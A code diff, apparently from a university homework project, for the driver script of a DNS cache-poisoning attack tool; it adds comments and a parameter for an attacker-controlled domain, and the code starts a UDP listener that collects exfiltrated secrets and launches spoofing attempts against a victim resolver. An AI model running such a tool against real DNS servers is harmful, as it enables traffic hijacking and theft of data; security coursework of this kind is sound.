@@ -4,9 +4,6 @@
 #   This package is responsible to execute all the passages required for the attack related to our ETH homework.
 #
 
-##      @file main
-#
-
 import dns.resolver
 from dns.resolver import NoAnswer
 
@@ -20,26 +17,38 @@ from blessings import Terminal #For terminal threading
 
 from threading import Thread
 
-from dns_poisoning import DNSPoisoning
+#from dns_poisoning import DNSPoisoning
 from dns_attack import DNSAttack
 
 
 #Globals
-secret_fetch_flag = True        #Used to stop the secret fetcher
+#-----------------------------------
+
+## Used to stop the secret fetcher
+
+## Flag that specifies whether the secret has been fetched or not
+secret_fetch_flag = True        
+## User-supplied verbosity value
 custom_verbosity = 0
+## Max available verbosity value
 max_verbosity = 4
+## Instance of the blessing terminal
 term = None
 attack_pool = None
 secret_socket = None
+## Flag that stops main activities
 stop = False
+## Specifies if coloured output should be used
 use_colors = True
 
+## The path of the file where secrets has to be written
 log_file = "log_secret.txt"
 
 ## Logging function
 #
 #   @brief The fuction used for output messages
 #   @param msg The message to display
+#   @param verbosity    The verbosity value (Default=1)
 #   Verbosity can be set in order to suppres the output
 #
 def log(msg, verbosity=1):
@@ -47,9 +56,15 @@ def log(msg, verbosity=1):
         if use_colors:
                 print(msg.format(t=term))
         else:
+                # Strips blessing terminal option before printing msg
                 print(msg.lstrip("{.*?}"))
         
 
+
+##
+#       @brief Handler of the CTRL+C
+#       Stop the secret fetcher routine and close all socket
+#
 def sigint_handler(sig, frame):
     import time
 
@@ -66,6 +81,8 @@ def sigint_handler(sig, frame):
 
 ##
 #       @brief Routine that fetch the secret
+#       @param server_ip        The IP address to bind
+#       @param server_port      The port where to bind
 #
 #       Start a small UDP server which listen on the provided port for the secrets.\n
 #       It also write the secrets into the log_file file.
@@ -103,18 +120,29 @@ def secret_fetcher(server_ip, server_port):
 #       @param victim_server_ip         The target server IP
 #       @param domain                   The domain to spoof
 #
-def launch_attack(victim_server_ip, domain, bad_server_data, attacker_ip,\
-         number_of_tries=None, victim_mac=None, nic_interface=None, attack_type=None):
+#       A function responsible for creating and initializating DNSAttack class       
+#
+def launch_attack(victim_server_ip, domain, bad_server_data, attacker_ip, bad_domain,\
+         ns_server_ip=None, number_of_tries=None, victim_mac=None, nic_interface=None, attack_type=None):
 
         attack = DNSAttack(victim_server_ip, domain, bad_server_data,\
-                 attacker_ip, victim_mac=victim_mac, nic_interface=nic_interface,\
-                sigint_handler=sigint_handler, log_function=log)
+                 attacker_ip, bad_domain=bad_domain, victim_mac=victim_mac,\
+                          nic_interface=nic_interface, ns_server_ip=ns_server_ip,\
+                                   sigint_handler=sigint_handler, log_function=log)
 
         if number_of_tries == None:
                 number_of_tries=50
 
         attack.start(number_of_tries, mode=DNSAttack.Mode.FAST) 
 
+
+##
+#       @brief Validate parameters value (eg. IP addresses, ports)
+#       @return True if everything is ok, False otherwise
+#
+#       Pass the provided parameters to the checking function, check_ip and check_port
+#       
+#
 def validate_parameters(params):
         global use_colors, term, custom_verbosity
 
@@ -148,15 +176,22 @@ def validate_parameters(params):
         if params is False:
                 print("Parameter error, exiting...")
                 return 
+
         if params['no_colors']:
                 use_colors = False   
         else:
                 term=Terminal()
+
         if params['verbosity'] is not None:
                 custom_verbosity = max_verbosity - int(params['verbosity'])
 
         return True
 
+
+##
+#       @brief Parse parameters present in *args
+#       @param args User-supplied parameters
+#
 def fetch_parameter(*args):
         parser = argparse.ArgumentParser(description='DNS Poisoning Attack Tool')
         parser.add_argument('-t', '--target-domain', dest='domain', help='The target domain to spoof', required=True, type=str)
@@ -165,8 +200,10 @@ def fetch_parameter(*args):
 
         parser.add_argument('-bs', '--bad-server-ip', dest='bad_server_ip', help='The Bad Guy DNS server IP', required=False, type=str, default='192.168.56.1')
         parser.add_argument('-bp', '--bad-server-port', dest='bad_server_port', help='The Bad Guy DNS server port', required=False, type=int, default=55553)
+        parser.add_argument('-bd', '--bad-domain', dest='bad_domain', help='The domain belonging to the attacker controlled zone', required=True, type=str)
         parser.add_argument('-ns', '--ns-server', dest='ns_server', help='The victim authoritative server', required=False, type=str)
         parser.add_argument('-i', '--interface', dest='interface', help='The Network Card interface to use', required=False, type=str)
+
 
         parser.add_argument('-at', '--attack-type', dest='attack_type', help='The type of attack to perform', choices=['NORMAL', 'DAN'], required=False, type=str, default='NORMAL')
         parser.add_argument('-m', '--mode', help='Mode to use', choices=['NORMAL','FAST'], required=False, type=str, default='NORMAL')
@@ -208,11 +245,11 @@ def check_ip(ip):
 
 ##
 #       @brief Check if a domain is valid
-#       Tries to resolve the domain in order to check if it is valid or not
+#       Tries to resolve the domain in order to check if it is valid or not(Unimplemented)
 #       
 #       @param domain   The domain to check
 #
-#       @bug Cannot specify which nameserver should be used
+#       @bug Cannot specify which nameserver should be used, unimplemented
 def check_domain(domain):
         return True
         #try:
@@ -222,7 +259,11 @@ def check_domain(domain):
         #        return False
         #return True
 
-
+##
+#       @brief Check if port is valid
+#       @param port     The port to check
+#       @return         True if is valid, False otherwise
+#
 def check_port(port):
         if port < 0 or port > 65535:
                 return False
@@ -242,24 +283,26 @@ def main(*args):
         #Bad Guy
         bad_server = (param['bad_server_ip'], param['bad_server_port'])
 
+        bad_domain = param['bad_domain']
+
         secret_ip = param['secret_ip']
         secret_port = param['secret_port']
 
         victim_mac = param['victim_mac']
         nic_interface = param['interface']
 
-        # @todo add the attack type
         attack_type = param['attack_type']
 
+        ns_server_ip = param['ns_server']
 
 
         #Launch the secret fetcher
-        secret_thread = Thread(target=secret_fetcher, args = (secret_ip, secret_port),daemon=True)
+        secret_thread = Thread(target=secret_fetcher, args = (secret_ip, secret_port), daemon=True)
         secret_thread.start()
 
         try:
 
-                launch_attack(victim_server_ip, domain, bad_server, attacker_ip ,number_of_tries=30,\
+                launch_attack(victim_server_ip, domain, bad_server, attacker_ip , bad_domain, ns_server_ip, number_of_tries=30,\
                          victim_mac=victim_mac, attack_type=attack_type, nic_interface=nic_interface)
 
         except DNSAttack.CriticalError:
